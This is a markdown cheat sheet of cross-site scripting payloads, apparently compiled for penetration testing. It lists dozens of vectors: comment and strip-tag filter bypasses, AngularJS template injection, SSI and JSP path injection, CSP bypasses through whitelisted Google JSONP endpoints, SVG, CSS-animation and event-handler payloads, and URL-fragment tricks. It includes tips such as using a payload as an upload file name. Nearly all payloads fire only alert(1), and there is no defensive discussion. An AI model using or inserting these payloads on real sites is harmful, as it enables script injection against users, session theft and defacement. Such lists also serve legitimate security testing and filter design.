## Basic Payloads:

```
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
<input onfocus="alert('XSS')">
<script>setTimeout(function(){alert('XSS')}, 100);</script>
<script>alert(String.fromCharCode(88,83,83));</script>
<script>if(1<2){alert('XSS')}</script>
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)/\
/alert(1)}/\
${alert(1)}
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
"><svg onload=alert(1)>.gif //On file upload try this as name
```


## Use this where text boxes, comment sections, etc that alows some markup input.
```
[clickme](javascript:alert`1`)
```

## XML Based XSS
```
<x:script xmlns:x="http:/www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http:/www.w3.org/1999/xhtml" src="collaborattor"/>
```

## AngularJS Injections (v1.6 and up)
```
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
&#123&#123$new.constructor('alert(1)')()&#125&#125
<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}

```


## XSS in SSI 
```
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
```

## Injection in JSP Path
```
/DOMAIN/PATH/;<svg onload=alert(1)>
/DOMAIN/PATH/;"><svg onload=alert(1)>
```


## Alert without Parentheses
```
setTimeout`alert\x28document.domain\x29`
setInterval`alert\x28document.domain\x29`
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41>

```


## Alert Alternative – Open Pseudo-Protocol
```
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
```


## Alert Alternative - Eval + URL
```
<svg onload=eval(" ' "+URL)>
<svg id=eval onload=top[id](" ' "+URL)>
```

## HTML Injection - Inline Alternative
```
"onpointerover=alert(1) /
"autofocus onfocusin=alert(1) /
"'>confirm&lpar;1)</Script><Svg><Script/1='
</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
<body onscrol=alert(1) style=overflow:auto;height:1000px id=x>#x
<body onscrol=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>
<body onhelp=alert(1)>
```

## Strip-Tags Based Bypass
```
"o<x>nmouseover=alert<x>(1)/
"autof<x>ocus o<x>nfocus=alert<x>(1)/
```

## Jump to URL Fragment
```
eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
```

## CSP Bypass (for Whitelisted Google Domains)
```
<script src=/www.google.com/complete/search?client=chrome%26jsonp=alert(1)> </script>
<script src=/www.googleapis.com/customsearch/v1?calback=alert(1)></script>
<script src=/ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
```


## SVG Vectors with Event Handlers
```
<svg><set onbegin=alert(1)>
<svg><set end=1 onend=alert(1)>
```

## SVG Vectors without Event Handlers
```
<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>
<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
```

## Vectors without Event Handlers
```
<script>alert(1)</script>
<script src=data:,alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
```

## Vectors with Agnostic Event Handlers
```
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x onauxclick=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmouseenter=alert(1)>hover this
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this!
<x onpointerdown=alert(1)>hover this!
<x onpointerenter=alert(1)>hover this!
<x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
<x onpointerout=alert(1)>hover this!
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this!
<x onpointerrawupdate=alert(1)>hover this!
```



## Mixed Context Reflection Entity Bypass

```
">'-alert(1)-'<svg>
">&#39-alert(1)-&#39<svg>
">alert(1)-"<svg>
"&#34>alert(1)-&#34<svg>
```

## Bypass using Comments

```
<!--><svg onload=alert(1)-->
```

## CSS Payloads

```
<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
```

## Less Known XSS Vectors

```
<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<video ontimeupdate=alert(1) controls src=/brutelogic.com.br/x.mp4>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<object onerror=alert(1)>
```

## Location with URL Fragment

```
javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme! </javascript>#*/alert(1)
<javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme! </javascript>#'-alert(1)
<javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
<j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
<javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas> #`-alert(1)
<javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
<j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
<javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
``


